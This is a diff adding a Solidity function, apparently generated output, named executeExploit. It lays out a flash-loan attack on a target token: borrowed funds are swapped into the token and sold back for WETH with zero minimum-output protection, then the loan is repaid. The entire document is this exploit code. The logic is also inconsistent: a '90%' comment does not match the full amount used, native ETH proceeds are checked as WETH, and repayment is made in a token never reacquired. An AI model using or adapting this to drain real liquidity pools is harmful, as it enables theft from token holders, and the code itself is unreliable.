@@ -1,0 +1,47 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Flash loan received
+    // Use 90% of the borrowed amount to swap into the target token
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // valuableToken address
+    path[1] = address(token); // TARGET token address
+
+    // Swap valuableToken for target token
+    uint[] memory amounts = uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amount,
+        0, // accept any amount of tokens
+        path,
+        address(this), // swap to this contract
+        block.timestamp
+    );
+
+    uint256 amountReceived = amounts[1]; // amount of target tokens received
+
+    // Now we take the received target tokens and sell them back to BNB (or ETH)
+    uint256 amountOutMin = 0; // accept any amount of WETH
+    address[] memory pathReverse = new address[](2);
+    pathReverse[0] = address(token); // Send target tokens
+    pathReverse[1] = uniswapRouter.WETH(); // To WETH
+    
+    // Approving the router to spend our tokens
+    IERC20(token).approve(address(uniswapRouter), amountReceived);
+    
+    // Swapping target tokens for WETH
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        amountReceived,
+        amountOutMin,
+        pathReverse,
+        address(this), // We want WETH sent to this contract
+        block.timestamp
+    );
+
+    uint256 newBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+    console.log("New WETH balance: ", newBalance);
+
+    // Repaying flash loan
+    uint256 fee = amount / 100; // Assuming the fee is 1%
+    IERC20(valuableToken).transfer(flashloanProvider, amount + fee); // Pay back the loan plus fee
+}
+</executeExploitCode>
+```
